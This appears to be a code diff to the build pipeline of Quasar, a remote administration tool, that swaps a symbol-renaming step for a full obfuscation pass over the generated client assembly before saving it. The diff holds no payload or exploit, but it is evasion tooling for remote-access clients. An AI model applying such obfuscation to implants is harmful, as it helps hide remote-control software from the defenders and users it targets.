@@ -8,6 +8,7 @@ using System.Security.Cryptography.X509Certificates;
 using System.Text;
 using Vestris.ResourceLib;
 using System.Diagnostics;
+using System.IO;
 
 namespace Quasar.Server.Build
 {
@@ -35,14 +36,18 @@ namespace Quasar.Server.Build
                 // PHASE 1 - Writing settings
                 WriteSettings(asmDef);
 
-                // PHASE 2 - Renaming
-                Renamer r = new Renamer(asmDef);
+                // PHASE 2 - Obfuscation
+                
+                MemoryStream stream = new MemoryStream();
+                asmDef.Write(stream);
+                byte[] data = new byte[stream.Length];
+                stream.Position = 0;
+                stream.Read(data, 0, (int)stream.Length);
+                stream.Close();
 
-                if (!r.Perform())
-                    throw new Exception("renaming failed");
-
-                // PHASE 3 - Saving
-                r.AsmDef.Write(_options.OutputPath);
+                Obfuscator.Core.Obfuscator obfuscator = new Obfuscator.Core.Obfuscator(data);
+                obfuscator.Obfuscate();
+                obfuscator.Save(_options.OutputPath);
             }
 
             // PHASE 4 - Assembly Information changing
